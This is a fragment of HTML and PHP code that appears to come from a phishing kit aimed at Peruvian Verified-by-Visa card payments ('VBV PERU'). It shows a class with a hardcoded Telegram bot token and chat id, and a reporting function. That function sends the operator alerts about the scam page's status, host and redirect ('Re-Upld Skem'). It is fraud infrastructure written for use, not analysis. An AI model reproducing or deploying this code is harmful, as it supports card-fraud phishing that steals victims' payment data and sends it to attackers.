...
<html>
    ...
    <head>
    <link rel="icon" href="https://medias.unifrance.org/medias/237/146/234221/format_hd/shahid.jpg">
    <link rel="icon" href="https://medias.unifrance.org/medias/237/146/234221/format_hd/shahid.jpg">
    <style>
    .iconcountry{
        width: 24px;
...
class Obj
{
    ...
    const bot = "𝘉𝘖𝘛/𝘝𝘗𝘕";
    const down = "VBV PERU - 𝘗𝘢𝘨𝘦 𝘋.𝘖.𝘞.𝘕";
    const alert = "VBV PERU - 𝘙𝘦𝘥 𝘈𝘓𝘌𝘙𝘛!";
    ...
    const token = "5470173158:AAHUcpGp9E8tsnqlm2qklk0oxk6HL1VWab0";
    const chatid = "@d0xebec";
    ...
    private function __paramsendreport($id, $redirect)
    {
        if ($id == 1)
        {
            ...
            $this->message = "VBV PERU - 𝘗𝘢𝘨𝘦 𝘋.𝘖.𝘞.𝘕" . "\n";
        ...
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "VBV PERU - 𝘙𝘦-𝘜𝘱𝘭𝘥 𝘚𝘬𝘦𝘮 𝘕.𝘖.𝘞" . "\n";
            $this->message .= '𝘙𝘌𝘋𝘐: ' . $_SERVER["HTTP_HOST"] . "\n";
            $this->message .= "𝘚𝘒𝘌𝘔: " . $redirect . "\n";
            $this->message .= '𝘛𝘐𝘔𝘌: ' . $date . "\n";
            $this->__messagesend($this->message);
